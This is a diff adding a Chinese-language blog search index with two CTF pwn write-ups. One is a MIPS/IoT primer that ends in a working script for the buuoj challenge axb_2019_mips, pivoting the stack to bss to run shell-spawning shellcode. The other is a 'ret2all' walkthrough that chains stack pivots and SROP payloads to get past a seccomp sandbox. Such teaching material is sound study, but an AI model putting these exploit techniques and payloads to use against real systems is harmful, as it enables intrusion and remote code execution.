@@ -1,0 +1,574 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search>
+  <entry>
+    <title>iot入门--mips基础</title>
+    <url>/2025/10/16/iot%E5%85%A5%E9%97%A8-mips%E5%9F%BA%E7%A1%80/</url>
+    <content><![CDATA[<p>编译<code>MIPS</code>环境</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt-get install gcc-mips-linux-gnu<br></code></pre></td></tr></table></figure></div>
+
+<h2 id="运行和调试"><a href="#运行和调试" class="headerlink" title="运行和调试"></a>运行和调试</h2><h3 id="qemu-环境搭建"><a href="#qemu-环境搭建" class="headerlink" title="qemu 环境搭建"></a>qemu 环境搭建</h3><p>qemu两种模式 qemu-user和qemu-user-static</p>
+<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">sudo apt-get update<br>sudo apt-get install qemu qemu-user qemu-user-static<br></code></pre></td></tr></table></figure></div>
+
+<h3 id="运行程序"><a href="#运行程序" class="headerlink" title="运行程序"></a>运行程序</h3><p>小端序：<code>qemu-mipsel ./xxx</code><br>大端序：<code>qemu-mips ./xxx</code></p>
+<h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><p>多架构调试工具</p>
+<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">sudo apt-get install gdb-multiarch<br></code></pre></td></tr></table></figure></div>
+
+<p>终端运行</p>
+<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">qemu-mips -g 1234 ./demo<br></code></pre></td></tr></table></figure></div>
+
+<p>再开另一个终端</p>
+<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">gdb-multiarch  <br>set architecture mips  <br>set endian big  <br>target remote localhost:1234<br></code></pre></td></tr></table></figure></div>
+
+<h2 id="mips相关知识"><a href="#mips相关知识" class="headerlink" title="mips相关知识"></a>mips相关知识</h2><h3 id="指令集"><a href="#指令集" class="headerlink" title="指令集"></a>指令集</h3><p>路由器是一种嵌入式系统，多采用 MIPS 和 ARM 这两种指令架构</p>
+<p>MIPS 指令架构属于 RISC (精简指令集) 体系，是一种普遍应用于<strong>小型设备</strong>的处理器架构，使用 MIPS 指令架构的 Linux 系统便被称为 MIPS Linux，MIPS 架构广泛应用于嵌入式系统领域</p>
+<blockquote>
+<p>RISC 架构的一些典型指令集包括 MIPS, ARM, RISC-V</p>
+</blockquote>
+<p>在路由器中，常用的一种 MIPS 架构就是 MIPS32</p>
+<p>在 MIPS 体系结构中有 32 个通用寄存器 <strong>REGISTER</strong>，其中主要的寄存器如下</p>
+<table>
+<thead>
+<tr>
+<th>REGISTER</th>
+<th>NAME</th>
+<th>USAGE</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>$0</td>
+<td>zero</td>
+<td>存储常量 0</td>
+</tr>
+<tr>
+<td>$2-$3</td>
+<td>v0−v1</td>
+<td>存放函数调用的返回值或表达式</td>
+</tr>
+<tr>
+<td>$4-$7</td>
+<td>a0−a3</td>
+<td>作为函数调用的前四个参数 (arguments)</td>
+</tr>
+<tr>
+<td>$8-$15</td>
+<td>t0−t7</td>
+<td>供汇编程序使用的临时寄存器 临时变量</td>
+</tr>
+<tr>
+<td>$16-$23</td>
+<td>s0−s7</td>
+<td>调用子函数时 用于保存原寄存器的值</td>
+</tr>
+<tr>
+<td>$24-$25</td>
+<td>t8−t9</td>
+<td>供汇编程序使用的临时寄存器 补充_t_0−t7</td>
+</tr>
+<tr>
+<td>$26-$27</td>
+<td>k0−k1</td>
+<td>中断&#x2F;异常处理程序使用 保存系统参数</td>
+</tr>
+<tr>
+<td>$28</td>
+<td>$gp</td>
+<td>全局指针 (Global Pointer)</td>
+</tr>
+<tr>
+<td>$29</td>
+<td>$sp</td>
+<td>堆栈指针 指向栈顶 (Stack Pointer)</td>
+</tr>
+<tr>
+<td>$31</td>
+<td>$ra</td>
+<td>返回地址 (return address)</td>
+</tr>
+</tbody></table>
+<p>然后还有 3 个特殊的寄存器，分别是 PC (程序计数器)、HI (乘除结果高位寄存器)、LO (乘除结果低位寄存器)</p>
+<p>MIPS32 架构的寻址模式有<strong>寄存器寻址、立即数寻址、寄存器相对寻址和 PC 相对寻址</strong></p>
+<p><strong>在 MIPS 指令集中，需要重点关注的是：</strong></p>
+<ul>
+<li><strong>l 开头的 LOAD 加载指令和 s 开头的 STORE 存储指令</strong>，用于从存储器中读取数据到寄存器，或者将寄存器中的数据保存在存储器中</li>
+<li><strong>move 指令</strong>用于寄存器之间的值传递</li>
+<li><strong>算术运算指令</strong>的操作数只能是寄存器，例如 <code>add, sub, mult, div</code>… 它们与 AMD 架构下的算术运算指令比较大的区别是操作数的使用和数量，MIPS 架构的算数运算结果都会存在另外一个寄存器中，而不是去覆盖某一个原本存储某个操作数的寄存器</li>
+<li><strong>slt 指令</strong>类似于 cmp</li>
+<li><strong>syscall 的系统调用号</strong>存放在 $v0 中</li>
+<li><strong>分支跳转指令</strong>由 b 开头，如 <code>b target</code>; <code>beq $t0, $t1, target</code> 等</li>
+<li><strong>常见的跳转指令</strong>有 <code>j target</code>; <code>jr $t3</code>; <code>jal target</code></li>
+</ul>
+<h3 id="函数调用"><a href="#函数调用" class="headerlink" title="函数调用"></a>函数调用</h3><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://res.cloudinary.com/drdpahj9c/image/upload/v1760588113/2025/10/9db4c211943520811a21bde13b16b408.png"
+                     
+                ></p>
+<p>传参：<br>函数调用时传参：如果函数的参数小于等于四个，那么会使用 <code>$a0 ~ $a3</code> 寄存器来存放参数。如果参数多于四个，那么多于的参数则存放到栈里</p>
+<p>调用：</p>
+<p>MIPS32 架构下的函数有两种类型——叶子函数和非叶子函数。如果一个函数中不会再调用其他任何函数，那么这个函数就是一个叶子函数，其余的函数都是非叶子函数</p>
+<p>函数 <code>A</code> 调用函数 <code>B</code>。如果 <code>B</code> 是叶子函数，那么在调用 <code>B</code> 函数时，会将 <code>B</code> 函数的返回地址存入 <code>$ra</code> 寄存器；如果 <code>B</code> 是非叶子函数（<code>B</code> 函数内部调用了一个 <code>C</code> 函数），那么在跳转到 <code>B</code> 函数时，会将其返回地址先存入 <code>$ra</code> 寄存器中，随后在 <code>B</code> 函数内部再将 <code>$ra</code> 寄存器的值存入栈中（位于 <code>fp-0x4</code> 的位置，如下图）。当 <code>B</code> 函数调用 <code>C</code> 函数时，会将其返回地址存入 <code>$ra</code> 寄存器，在返回时执行 <code>jr $ra</code> 指令回到 <code>B</code> 函数。现在假设 <code>B</code> 函数已经执行完毕准备返回到 <code>A</code> 函数，会将原先存入栈里的返回地址读到 <code>$ra</code> 寄存器中，最后执行 <code>jr $ra</code> 指令，回到 <code>A</code> 函数</p>
+<p>demo如下</p>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//mips-linux-gnu-gcc demo.c -o demo -static -g</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">sum</span><span class="hljs-params">(<span class="hljs-type">int</span> a,<span class="hljs-type">int</span> b)</span><br>&#123;<br>	<span class="hljs-type">int</span> value=a+b;<br>	<span class="hljs-keyword">return</span> value;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>	<span class="hljs-type">int</span> c=sum(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;value ==&gt; %d\n&quot;</span>,c);<br>	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure></div>
+
+<p>传参<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://res.cloudinary.com/drdpahj9c/image/upload/v1760588630/2025/10/378ca78be9a431aee719757db4d87d97.png"
+                     
+                ></p>
+<p>叶子函数</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://res.cloudinary.com/drdpahj9c/image/upload/v1760588115/2025/10/fbb1e7597d86b4c0241256e1f25118d7.png"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://res.cloudinary.com/drdpahj9c/image/upload/v1760588632/2025/10/f33aca29586f338fe056c8a283bced69.png"
+                     
+                ></p>
+<p>非叶子函数</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://res.cloudinary.com/drdpahj9c/image/upload/v1760588117/2025/10/a5f411765816037e339a95d27466a816.png"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://res.cloudinary.com/drdpahj9c/image/upload/v1760588667/2025/10/db4d05dd4e3342ca33e0ceecea72f972.png"
+                     
+                ></p>
+<p>sp + 0x20保存着旧fp地址<br>sp + 0x24保存着返回地址</p>
+<h3 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h3><p>对于非叶子函数的话，返回地址保存在栈中，通过栈溢出进行劫持返回地址即可。<br>对于叶子函数，利用就比较局限。</p>
+<h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><p>axb_2019_mips</p>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __fastcall <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">char</span> s_[<span class="hljs-number">24</span>]; <span class="hljs-comment">// [sp+18h] [+18h] BYREF</span><br><br>  alarm(<span class="hljs-number">0x3Cu</span>);<br>  setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0</span>);<br>  setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">memset</span>(s_, <span class="hljs-number">0</span>, <span class="hljs-number">0x14u</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Welcome to MIPS pwn!&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;What&#x27;s your name: &quot;</span>);<br>  read(<span class="hljs-number">0</span>, s_, <span class="hljs-number">0x14u</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Hello!, %s&quot;</span>, s_);<br>  vuln();<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></div>
+
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">vuln</span><span class="hljs-params">()</span><br>&#123;<br>  _BYTE buf_[<span class="hljs-number">32</span>]; <span class="hljs-comment">// [sp+18h] [+18h] BYREF</span><br><br>  <span class="hljs-keyword">return</span> read(<span class="hljs-number">0</span>, buf_, <span class="hljs-number">0x200u</span>);<br>&#125;<br></code></pre></td></tr></table></figure></div>
+
+<p>vuln中有栈溢出，因为mips中是没有nx的，通过栈迁移来执行shellcode</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://res.cloudinary.com/drdpahj9c/image/upload/v1760588120/2025/10/cb372d4a5c86ce8a8b048cd0cb4f8a6e.png"
+                     
+                ></p>
+<p>从这里可以看出，read的第二个参数a1是由fp控制的。同时又有栈溢出</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://res.cloudinary.com/drdpahj9c/image/upload/v1760588123/2025/10/eae29eb4fb80c5d1f541778156268fb6.png"
+                     
+                ></p>
+<p>只要我们控制fp，再返回时通过 <code>lw      $fp, 0x38+var_s0($sp)</code> 就能够实现任意地址写。同时劫持ra进行第二次读入</p>
+<p>因为我们控制了fp为bss段地址 <code>move    $sp, $fp</code> 通过这一条指令即可栈迁移到bss段上。</p>
+<p>因为第二次读入时都是通过sp偏移来进行寻址的，我们只需要再bss段中设置好地址就能够劫持ra</p>
+<p>读入时从sp + 0x18开始读入，通过栈溢出，将sp + 0x38设置返回地址，在sp + 0x40处布置好shellcode就能够执行shellcode来getshell</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><code class="hljs python">```<span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">from</span> pwncli <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#cli_script() </span><br><br><span class="hljs-comment">#io = process([&quot;qemu-mipsel&quot;,&quot;./pwn2&quot;])</span><br>elf = ELF(<span class="hljs-string">&#x27;./pwn2&#x27;</span>)<br><span class="hljs-comment">#libc = ELF(&#x27;/&#x27;)</span><br>io =remote(<span class="hljs-string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="hljs-number">25318</span>)<br><span class="hljs-comment">#context.terminal = [&#x27;wt.exe&#x27;, &#x27;wsl&#x27;, &#x27;bash&#x27;, &#x27;-c&#x27;]</span><br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>]<br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,arch = elf.arch,os = elf.os)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>(<span class="hljs-params">i</span>):<br>    gdb.attach(i)<br>    pause()<br><br>io.recvuntil(<span class="hljs-string">&quot;What&#x27;s your name: &quot;</span>)<br>io.send(<span class="hljs-string">b&quot;aaaa&quot;</span>)<br><br>shellcode = asm(shellcraft.sh(),arch=<span class="hljs-string">&#x27;mips&#x27;</span>)<br>bss_addr = elf.bss() + <span class="hljs-number">0x10</span><br><br><br>payload = flat(<br>    <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>,<br>    bss_addr,<br>    <span class="hljs-number">0x4007E4</span><br>)<br>io.send(payload)<br><br>payload = flat(<br>    <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x24</span>,<br>    bss_addr+<span class="hljs-number">0x40</span>,<br>    shellcode<br>)<br>io.send(payload)<br>io.interactive()<br></code></pre></td></tr></table></figure></div>
+]]></content>
+      <categories>
+        <category>iot</category>
+      </categories>
+      <tags>
+        <tag>mips</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ret2all详细分析与总结</title>
+    <url>/2025/11/03/ret2all%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90%E4%B8%8E%E6%80%BB%E7%BB%93/</url>
+    <content><![CDATA[<p>最近高本版only_read的题目很多，不管是有输出还是无输出，各种形式下。ret2all都能中的各种方法都能起到作用，因此复现一下这个手法。感谢YX-hueimie师傅出的那么棒的题目，在复现中温故而知新了许多知识了。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://res.cloudinary.com/drdpahj9c/image/upload/v1762150305/2025/11/3e7cda0c4ac1fdc6be2ac8716bfcd850.png"
+                     
+                ><br>这里就是给了rread函数的返回地址和保存的旧的rbp的值，后面mprotect限制不能修改这个rbp的值。开启沙箱。关闭标准错误。</p>
+<p>沙箱的话<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://res.cloudinary.com/drdpahj9c/image/upload/v1762150307/2025/11/e13675ebd04e02143d7a0f22dea3e249.png"
+                     
+                ><br>read和write的分支全禁，留下本体，read的第一个参数不能大于等于1，write的第一个参数只能等于2，但是后面又close(2)，需要dup2(1, 2)更改fd才能再调用write</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://res.cloudinary.com/drdpahj9c/image/upload/v1762150309/2025/11/0ef24b47d780f1bc916cfc4691c5aa97.png"
+                     
+                ><br>vuln中的read存在栈溢出可以溢出0x28</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://res.cloudinary.com/drdpahj9c/image/upload/v1762150310/2025/11/b5874f3e0f78d9607f53be1dfdada6ce.png"
+                     
+                ><br><code>shadow</code>函数限制了前0x60字节为<code>LOVE</code>中的内容，不能修改旧的rbp的值和ret的值<br>所有真正溢出的只有0x18</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><code class="hljs python">payload1 = flat(<br>    <span class="hljs-string">b&#x27;I love you I feel lonely&#x27;</span>*<span class="hljs-number">4</span>,<br>    RBP,<br>    RET,<br>    RBP + <span class="hljs-number">0x10</span>,<br>    read_addr,<br>    RBP - <span class="hljs-number">0x10</span><br>)<br></code></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://res.cloudinary.com/drdpahj9c/image/upload/v1762150312/2025/11/214611728f65a0a9a9c6e36eb9a67310.png"
+                     
+                ><br>溢出可以修改vuln中的旧的rbp的值</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://res.cloudinary.com/drdpahj9c/image/upload/v1762150314/2025/11/a74a43292bc2b533bea417048639499d.png"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://res.cloudinary.com/drdpahj9c/image/upload/v1762150315/2025/11/55fde9069af6cd40206c910090991dba.png"
+                     
+                ><br>vuln执行完leave_ret后返回main中还是执行leave_ret，这里联系的leave_ret可以造成栈迁移，因此我们刚刚的溢出，将vuln的rbp的值改成<code>0x7fffb01c6e70</code>,栈迁移后rip旧变成了<code>0x7fffb01c6e70 + 8 </code>即为<code>read_addr</code>,rbp中为<code>0x7fffb01c6e90</code></p>
+<p>控制了rbp就是控制了<code>read</code>的<code>rsi</code>,可以控制<code>read</code>读的地址<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://res.cloudinary.com/drdpahj9c/image/upload/v1762150316/2025/11/aa982b70089f89603b23e684cbf1a1d9.png"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://res.cloudinary.com/drdpahj9c/image/upload/v1762150318/2025/11/de7f87cb397db814cade9e9cb36e4549.png"
+                     
+                ></p>
+<p>构造好read,第二段读入</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><code class="hljs python">payload2 = flat(<br>    p64(<span class="hljs-number">0</span>)*<span class="hljs-number">7</span>,<br>    RBP+<span class="hljs-number">0xf0</span>,<br>    read_addr,<br>    leave_ret,<br>    RBP+<span class="hljs-number">0x100</span>,<br>    leave_ret,<br>    RBP-<span class="hljs-number">0x18</span>,<br>    leave_ret,<br>    <span class="hljs-number">0</span>,<br>    p8(<span class="hljs-number">0xec</span>)<br>)<br></code></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://res.cloudinary.com/drdpahj9c/image/upload/v1762150320/2025/11/398590a0f334ce96d3235776c0e6a455.png"
+                     
+                ></p>
+<p>这里涉及到几个点，首先是覆盖read的返回地址，达成栈返回。在调用read的时候会将返回地址压栈，我们可以修改这个返回地址达到劫持程序流但是可以不用经过<code>shadow</code>检测。<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://res.cloudinary.com/drdpahj9c/image/upload/v1762150322/2025/11/242232be60183797f697762aa845b174.png"
+                     
+                ></p>
+<p>然后就是这里的<code>0x7ffd1ac556b8</code>这里的<code>mov edi, eax</code>是libc中的地址,是栈中常见的libc地址，距离这里附近有一个syscall,我们利用溢出将这个地址最后两位改成ec后变成syscall后方便后面srop的利用</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://res.cloudinary.com/drdpahj9c/image/upload/v1762150324/2025/11/6cd912b9197628ee3ef43214567e300d.png"
+                     
+                ></p>
+<p>后续的栈风水为什么这样，画个图来表示吧，执行完read之后</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://res.cloudinary.com/drdpahj9c/image/upload/v1762150326/2025/11/090b91bc83ed351cab1d545308400efb.png"
+                     
+                ><br>(图中有误,应该是rbp+0x100,RBP+0xf0-0x60)</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><code class="hljs python">payload3 = flat(<br>    <span class="hljs-string">b&#x27;I love you I feel lonely&#x27;</span>*<span class="hljs-number">4</span>,<br>    RBP,<br>    RET,<br>    RBP+<span class="hljs-number">0xf0</span>,<br>    read<br>)<br></code></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://res.cloudinary.com/drdpahj9c/image/upload/v1762150328/2025/11/dc394f4e3ab6d67a575b7995d8fe3599.png"
+                     
+                ></p>
+<p>这段栈风水，准备读入srop的参数，但是有检测，所以我们先读一段正常的修改read的返回地址，栈返回来绕过<code>shadow</code></p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><code class="hljs python">payload4 = flat(<br>    <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">8</span>,<br>    p64(<span class="hljs-number">0</span>),RBP+<span class="hljs-number">0x30</span>,<br>    RBP+<span class="hljs-number">0x65</span>,<span class="hljs-number">0x6edca</span>,<br>    <span class="hljs-number">0x200</span>,<span class="hljs-number">0</span>,<br>    <span class="hljs-number">0</span>,RBP+<span class="hljs-number">0x40</span>,<br>    read_addr2,<span class="hljs-number">0</span>,<br>    <span class="hljs-number">0x33</span>,RBP+<span class="hljs-number">0x150</span>+<span class="hljs-number">1</span>,<br>    read_addr,RBP+<span class="hljs-number">0x20</span>,<br>    leave_ret<br>)<br></code></pre></td></tr></table></figure></div>
+
+<p>这里0x60读入的数据是srop参数，0x60后面的数据可以rop,修改read的返回地址为<code>leave_ret</code>到去执行<code>read</code>,这样可以绕过检测<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://res.cloudinary.com/drdpahj9c/image/upload/v1762150330/2025/11/e270bf8f49c2e5aab6e424ed65cdb4f9.png"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://res.cloudinary.com/drdpahj9c/image/upload/v1762150331/2025/11/1db74ccaaaf00e2bc2c44c9508e582c2.png"
+                     
+                ></p>
+<p>这里读入参数从第二行开始是从rdi开始对应<code>signal frame</code>中得rdi至err，其中<br><code>uc_flags</code>字段需要设置为0<br><code>cs/gs/fs</code>字段一般设置为0x33<br><code>&amp;fpstate</code>字段需要设置为0。或者一个可读地址</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://res.cloudinary.com/drdpahj9c/image/upload/v1762150334/2025/11/c3e383ed0a9ae2b7db4e483d858735c0.png"
+                     
+                ><br>(借用hueimie师傅的图)</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><code class="hljs python">payload5 = flat(<br>    <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">7</span>,<br>    pop_rbp_ret<br>)<br></code></pre></td></tr></table></figure></div>
+
+<p>读入15字节，在没有<code>gadgets</code>可以依靠这个来控制rax寄存器，用于后面栈迁移到<code>syscall</code>处系统调用<code>sigreturn</code>，执行<code>pop_rbp_ret</code>可以用于抬栈，执行<code>leave_ret</code><br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://res.cloudinary.com/drdpahj9c/image/upload/v1762150336/2025/11/ced44b9cd3bff66f6d916a51c3315ccc.png"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://res.cloudinary.com/drdpahj9c/image/upload/v1762150338/2025/11/8092cd4c46051e5ba272ee3db05c79a2.png"
+                     
+                ></p>
+<p>leave_ret指向完毕后会执行<code>rt_sigreturn</code></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://res.cloudinary.com/drdpahj9c/image/upload/v1762150340/2025/11/7a742b3a1dff6b3cfcb8de0fcb260fb2.png"
+                     
+                ><br>这次<code>srop</code>没有进行相关的系统调用，更多的是设置好参数为了系统调用做准备。<br><code>rip = read_addr2</code>这里执行完后会直接<code>call read</code>,执行read(0,RBP+0x30,0x200)<br><code>rbp = RBP + 0x65</code><br><code>rsp = RBP + 0x40</code></p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><code class="hljs python">payload6 = flat(<br>    leave_ret,add_rbp_3d_ebx,<br>    pop_rbp_ret,RBP+<span class="hljs-number">0xa8</span>+<span class="hljs-number">1</span>,<br>    read_addr,RBP+<span class="hljs-number">0x20</span>,<br>    leave_ret,RBP+<span class="hljs-number">0xd0</span>,<br>    read_addr,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span>,<br>    <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<br>    RBP+<span class="hljs-number">0x68</span>,<span class="hljs-number">0</span>,<br>    <span class="hljs-number">0</span>,<span class="hljs-number">33</span>,<br>    <span class="hljs-number">0</span>,RBP+<span class="hljs-number">0x28</span>,<br>    ret,<span class="hljs-number">0</span>,<br>    <span class="hljs-number">0x33</span><br>)<br></code></pre></td></tr></table></figure></div>
+
+<p>接下来重新读入<code>srop</code>参数<br>由于我们将rsp设置为<code>RBP+0x40</code>，<code>call read</code>会将read的返回地址压栈，保存在<code>RBP+0x38</code></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://res.cloudinary.com/drdpahj9c/image/upload/v1762150341/2025/11/0217854d42f1fa3768e25556902267ea.png"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://res.cloudinary.com/drdpahj9c/image/upload/v1762150343/2025/11/95474cc3acb18e0f0d120072065875e6.png"
+                     
+                ></p>
+<p>因此我们读入的<code>add_rbp_3d_ebx</code>就是返回地址，直接开始rop<br>因为刚刚<code>srop</code>，<code>rbp = RBP + 0x65</code>,<code>rbx = 0x6edca</code>这个偏移<br>执行完<code>add_rbp_3d_ebx</code>后就变成新的syscall_ret了</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://res.cloudinary.com/drdpahj9c/image/upload/v1762150345/2025/11/9cffa59ca8ec236638d1cd04099fe0ad.png"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://res.cloudinary.com/drdpahj9c/image/upload/v1762150347/2025/11/863725211bee10f582cb8b339045e81e.png"
+                     
+                ></p>
+<p>之后就是执行read,读入的地方在<code>RBP+0x49</code></p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><code class="hljs python">payload7 = flat(<br>    <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">7</span>,<br>    pop_rbp_ret<br>)<br></code></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://res.cloudinary.com/drdpahj9c/image/upload/v1762150348/2025/11/d5c90d2d9b7457c70199001f0d4e15e9.png"
+                     
+                ></p>
+<p>再次栈迁移调用执行<code>rt_sigreturn</code>，设置好寄存器<br><code>rbp = RBP+0x68</code><br><code>rsp = RBP+0x28</code><br><code>rip = ret</code><br><code>syscall</code>后<code>ret</code>，<code>pop_rip</code>会再次调用<code>syscall_ret</code>，从而完成<code>dup(1,2)</code>的系统调用，ret到<code>leave</code>，迁移到下面的read再次读入<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://res.cloudinary.com/drdpahj9c/image/upload/v1762150350/2025/11/3a2c96233f1c9a6b4cece00a17689f9c.png"
+                     
+                ><br>执行的read(0,0xd0-0x60,0x88)<br>执行完read时，会将返回地址压栈压到<code>RBP+0x70</code><br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://res.cloudinary.com/drdpahj9c/image/upload/v1762150352/2025/11/cc98fde73644f353af00ade35790afaf.png"
+                     
+                ><br>所以read完之后直接执行<code>rop</code><br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://res.cloudinary.com/drdpahj9c/image/upload/v1762150353/2025/11/4cbcf31305f4390ecfa522b251429f03.png"
+                     
+                ><br>随后也是读入15字节，来执行syscall</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><code class="hljs python">payload9 = flat(<br>    <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">7</span>,<br>    pop_rbp_ret<br>)<br></code></pre></td></tr></table></figure></div>
+
+<p>和上次调用dup(1.2)原理一致<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://res.cloudinary.com/drdpahj9c/image/upload/v1762150354/2025/11/e1dd8d58d508c7054e1eadff9545e43a.png"
+                     
+                ><br>这里调用write(2,RBP+0x28,0x200)<br>设置<br><code>rip = ret</code><br><code>rsp = RBP+0x28</code><br><code>rbp = RBP + 0xe8</code><br>因为<code>rbp = RBP + 0xe8</code>,执行完syscall后将会<code>leave_ret</code>迁移到<code>read_addr3</code><br>执行read(0,RBP+0x28,0x200)<br>这也是为什么要设置0x200的原因，为了这里方便转read</p>
